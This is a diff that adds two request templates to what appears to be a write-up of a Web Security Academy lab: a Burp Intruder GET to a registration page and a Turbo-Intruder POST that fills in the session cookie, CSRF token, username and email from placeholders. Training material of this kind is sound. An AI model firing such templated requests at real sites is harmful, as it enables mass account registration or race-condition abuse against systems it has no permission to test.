@@ -36,6 +36,10 @@ instance. So we can just generate them in advance in the stock Intruder.
 Here's the request I used in Intruder:
 
 ```
+GET /register HTTP/2
+Host: <host>.web-security-academy.net
+X-Count: §xxx§
+
 ```
 
 Here's an example of the Intruder attack output. I just did a select all,
@@ -56,6 +60,12 @@ copy in the intruder output and pasted it into a file called
 
 Turbo-Intruder request:
 ```
+POST /%s HTTP/2
+Host: <host>.web-security-academy.net
+Cookie: phpsessionid=%s
+Content-Type: application/x-www-form-urlencoded
+
+csrf=%s&username=%s&email=%s%40ginandjuice.shop&password=peter
 ```
 
 Turbo-Intruder configuration:
